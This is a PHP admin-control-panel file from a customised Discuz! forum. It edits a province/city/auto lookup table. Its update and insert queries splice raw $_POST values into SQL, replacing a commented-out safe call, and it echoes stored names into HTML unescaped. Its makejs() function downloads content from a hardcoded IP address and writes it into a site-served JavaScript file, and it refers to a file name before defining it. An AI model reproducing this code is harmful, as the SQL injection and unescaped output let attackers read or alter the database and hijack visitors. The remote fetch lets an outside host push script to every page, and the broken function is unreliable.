<?php

/**
 *      [Discuz!] (C)2001-2099 Comsenz Inc.
 *      This is NOT a freeware, use is subject to license terms
 *
 *      $Id: admincp_auto.php 19363 2010-12-29 02:35:55Z zhengqingpeng $
 */

if(!defined('IN_DISCUZ') || !defined('IN_ADMINCP')) {
	exit('Access Denied');
}

cpheader();

shownav('global', 'auto');
$values = array(intval($_GET['pid']), intval($_GET['cid']), intval($_GET['did']));
$elems = array($_GET['province'], $_GET['city'], $_GET['auto']);
$level = 1;
$upids = array(0);
$theid = 0;
for($i=0;$i<3;$i++) {
	if(!empty($values[$i])) {
		$theid = intval($values[$i]);
		$upids[] = $theid;
		$level++;
	} else {
		for($j=$i; $j<3; $j++) {
			$values[$j] = '';
		}
		break;
	}
}

if(submitcheck('editsubmit')) {

	$delids = array();
	$query = DB::query('SELECT * FROM zdy_common_auto'." WHERE upid ='$theid'");
	while($value = DB::fetch($query)) {
		$usetype = 0;
		if($_POST['birthcity'][$value['id']] && $_POST['residecity'][$value['id']]) {
			$usetype = 3;
		} elseif($_POST['birthcity'][$value['id']]) {
			$usetype = 1;
		} elseif($_POST['residecity'][$value['id']]) {
			$usetype = 2;
		}
		if(!isset($_POST['auto'][$value['id']])) {
			$delids[] = $value['id'];
		} elseif($_POST['auto'][$value['id']] != $value['name'] || $_POST['displayorder'][$value['id']] != $value['displayorder'] || $usetype != $value['usetype']) {
			//DB::update('common_auto', array('name'=>$_POST['auto'][$value['id']], 'displayorder'=>$_POST['displayorder'][$value['id']], 'usetype'=>$usetype), array('id'=>$value['id']));
			$auto=$_POST['auto'][$value['id']];
			$displayorder=$_POST['displayorder'][$value['id']];
			$id=$value['id'];
				$query = DB::query("update   zdy_common_auto set name='$auto',displayorder='$displayorder',usetype='$usetype' where id='$id'");
		}
	}
	if($delids) {
		$ids = $delids;
		for($i=$level; $i<4; $i++) {
			$query = DB::query('SELECT id FROM  zdy_common_auto'." WHERE upid IN (".dimplode($ids).')');
			$ids = array();
			while($value=DB::fetch($query)) {
				$value['id'] = intval($value['id']);
				$delids[] = $value['id'];
				$ids[] = $value['id'];
			}
			if(empty($ids)) {
				break;
			}
		}
		DB::query('DELETE FROM  zdy_common_auto'." WHERE id IN (".dimplode($delids).')');
	}
	if(!empty($_POST['autonew'])) {
		$inserts = array();
		$displayorder = '';
		foreach($_POST['autonew'] as $key => $value) {
			$displayorder = trim($_POST['autonew_order'][$key]);
			$value = trim($value);
			$firstletter = getfirstchar($value); 

			if(!empty($value)) {
				 if($level<3)
				{$inserts[] = "('$value', '$level',  '$theid', '$displayorder', '$firstletter')";}
				else				
				{$inserts[] = "('$value', '$level',  '$theid', '$displayorder')";}
			}
		}
		if($inserts) {
		 if($level<3)		 
		{DB::query('INSERT INTO  zdy_common_auto'."(`name`, level, upid, displayorder,firstletter) VALUES ".implode(',',$inserts));}
		 else
		{DB::query('INSERT INTO  zdy_common_auto'."(`name`, level, upid, displayorder) VALUES ".implode(',',$inserts));}
		}
	}
	
makejs();
	cpmsg('setting_auto_edit_success', 'action=auto&pid='.$values[0].'&cid='.$values[1].'&did='.$values[2], 'succeed');

} else {
	showsubmenu('auto');
	showtips('auto_tips');

	showformheader('auto&pid='.$values[0].'&cid='.$values[1].'&did='.$values[2]);
	showtableheader();

	$options = array(1=>array(), 2=>array(), 3=>array());
	$thevalues = array();
	$query = DB::query('SELECT * FROM  zdy_common_auto'." WHERE upid IN (".dimplode($upids).') ORDER BY displayorder, firstletter');
	while($value = DB::fetch($query)) {
		$options[$value['level']][] = array($value['id'], $value['firstletter'].' '.$value['name']);
		if($value['upid'] == $theid) {
			$thevalues[] = array($value['id'], $value['name'], $value['displayorder'], $value['usetype']);
		}
	}

	$names = array('province', 'city', 'auto');
	for($i=0; $i<3;$i++) {
		$elems[$i] = !empty($elems[$i]) ? $elems[$i] : $names[$i];
	}
	$html = '';
	for($i=0;$i<3;$i++) {
		$l = $i+1;
		$jscall = ($i == 0 ? 'this.form.city.value=\'\';this.form.auto.value=\'\';' : '')."refreshauto('$elems[0]', '$elems[1]', '$elems[2]')";
		$html .= '<select name="'.$elems[$i].'" id="'.$elems[$i].'" onchange="'.$jscall.'">';
		$html .= '<option value="">'.lang('spacecp', 'auto_level_'.$l).'</option>';
		foreach($options[$l] as $option) {
			$selected = $option[0] == $values[$i] ? ' selected="selected"' : '';
			$html .= '<option value="'.$option[0].'"'.$selected.'>'.$option[1].'</option>';
		}
		$html .= '</select>&nbsp;&nbsp;';
	}
	echo cplang('auto_choose').' &nbsp; '.$html;
	showsubtitle($values[0] ? array('', 'display_order', 'name', 'operation') : array('', 'display_order', 'name',  'operation'));
	foreach($thevalues as $value) {
		$valarr = array();
		$valarr[] = '';
		$valarr[] = '<input type="text" id="displayorder_'.$value[0].'" class="txt"  name="displayorder['.$value[0].']" value="'.$value[2].'"/>';
		$valarr[] = '<p id="p_'.$value[0].'"><input type="text" id="input_'.$value[0].'" class="txt" style="width:300px;" name="auto['.$value[0].']" value="'.$value[1].'"/></p>';
		 
		$valarr[] = '<a href="javascript:;" onclick="deleteauto('.$value[0].');return false;">'.cplang('delete').'</a>';
		showtablerow('id="td_'.$value[0].'"', array('', 'class="td25"','','','',''), $valarr);
	}
	showtablerow('', array('colspan=2'), array(
			'<div><a href="javascript:;" onclick="addrow(this, 0, 1);return false;" class="addtr">'.cplang('add').'</a></div>'
		));
	showsubmit('editsubmit', 'submit');
	$adminurl = ADMINSCRIPT.'?action=auto';
echo <<<SCRIPT
<script type="text/javascript">
var rowtypedata = [
	[[1,'', ''],[1,'<input type="text" class="txt" name="autonew_order[]" value="0" />', 'td25'],[2,'<input type="text" class="txt" name="autonew[]" value="" />', '']],
];
function refreshauto(province, city, auto) {
	location.href = "$adminurl"
		+ "&province="+province+"&city="+city+"&auto="+auto
		+"&pid="+$(province).value + "&cid="+$(city).value+"&did="+$(auto).value;
}

function editauto(did) {
	$('input_' + did).style.display = "block";
	$('span_' + did).style.display = "none";
}

function deleteauto(did) {
	var elem = $('p_' + did);
	elem.parentNode.removeChild(elem);
	var elem = $('td_' + did);
	elem.parentNode.removeChild(elem);
}
</script>
SCRIPT;
	showtablefooter();
	showformfooter();
}
function getfirstchar($s0){
if(ord($s0)>="1" and ord($s0)<=ord("z") )   { return strtoupper($s0); }
$s=iconv("UTF-8","gb2312", $s0);
$asc=ord($s{0})*256+ord($s{1})-65536;
if($asc>=-20319 and $asc<=-20284)return "A";
if($asc>=-20283 and $asc<=-19776)return "B";
if($asc>=-19775 and $asc<=-19219)return "C";
if($asc>=-19218 and $asc<=-18711)return "D";
if($asc>=-18710 and $asc<=-18527)return "E";
if($asc>=-18526 and $asc<=-18240)return "F";
if($asc>=-18239 and $asc<=-17923)return "G";
if($asc>=-17922 and $asc<=-17418)return "H";              
if($asc>=-17417 and $asc<=-16475)return "J";              
if($asc>=-16474 and $asc<=-16213)return "K";              
if($asc>=-16212 and $asc<=-15641)return "L";              
if($asc>=-15640 and $asc<=-15166)return "M";              
if($asc>=-15165 and $asc<=-14923)return "N";              
if($asc>=-14922 and $asc<=-14915)return "O";              
if($asc>=-14914 and $asc<=-14631)return "P";              
if($asc>=-14630 and $asc<=-14150)return "Q";              
if($asc>=-14149 and $asc<=-14091)return "R";              
if($asc>=-14090 and $asc<=-13319)return "S";              
if($asc>=-13318 and $asc<=-12839)return "T";              
if($asc>=-12838 and $asc<=-12557)return "W";              
if($asc>=-12556 and $asc<=-11848)return "X";              
if($asc>=-11847 and $asc<=-11056)return "Y";              
if($asc>=-11055 and $asc<=-10247)return "Z";  
return 0;
}

//自动生成js文件
function makejs()
{
$url='http://211.94.187.157/autojs.php';
//echo  $url;
$content=file_get_contents($url); 
//检查是否存在旧文件，有则删除 
if(file_exists($filename)) unlink($filename); 
//设置静态文件路径及文件名 
$filename=$_G['siteurl'].'autojs.js'; 
//写入文件 
$fp = fopen($filename, 'w'); 
fwrite($fp, $content); 

}
?>